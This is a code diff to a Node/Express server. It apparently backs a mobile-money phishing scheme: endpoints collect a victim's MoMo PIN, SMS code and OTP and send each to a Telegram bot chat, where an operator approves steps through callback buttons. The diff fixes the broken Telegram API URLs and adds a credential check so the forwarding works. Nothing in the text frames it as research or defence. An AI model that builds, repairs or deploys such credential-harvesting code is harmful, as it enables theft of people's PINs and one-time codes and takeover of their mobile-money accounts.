@@ -25,7 +25,7 @@ app.post('/applications', (req, res) => {
   res.json({ id: appId });
 });
 
-// Submit MoMo Auth / PIN for Approval
+// Submit MoMo Auth / PIN for Approval with safety checks
 app.post('/applications/:id/submit-auth', async (req, res) => {
   const appId = req.params.id;
   const appData = applications[appId];
@@ -49,7 +49,12 @@ app.post('/applications/:id/submit-auth', async (req, res) => {
   };
 
   try {
-    const response = await fetch(`[https://api.telegram.org/bot$](https://api.telegram.org/bot$){TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.error('CRITICAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing from environment variables!');
+      return res.status(500).json({ error: 'Server configuration error: Missing Telegram credentials' });
+    }
+
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
@@ -94,7 +99,7 @@ app.post('/applications/:id/submit-sms', async (req, res) => {
   };
 
   try {
-    const response = await fetch(`[https://api.telegram.org/bot$](https://api.telegram.org/bot$){TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, reply_markup: keyboard })
@@ -136,7 +141,7 @@ app.post('/applications/:id/submit-otp', async (req, res) => {
   };
 
   try {
-    const response = await fetch(`[https://api.telegram.org/bot$](https://api.telegram.org/bot$){TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
@@ -184,7 +189,7 @@ app.post('/telegram-webhook', async (req, res) => {
     }
 
     try {
-      await fetch(`[https://api.telegram.org/bot$](https://api.telegram.org/bot$){TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -194,7 +199,7 @@ app.post('/telegram-webhook', async (req, res) => {
         })
       });
 
-      await fetch(`[https://api.telegram.org/bot$](https://api.telegram.org/bot$){TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -215,3 +220,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+  
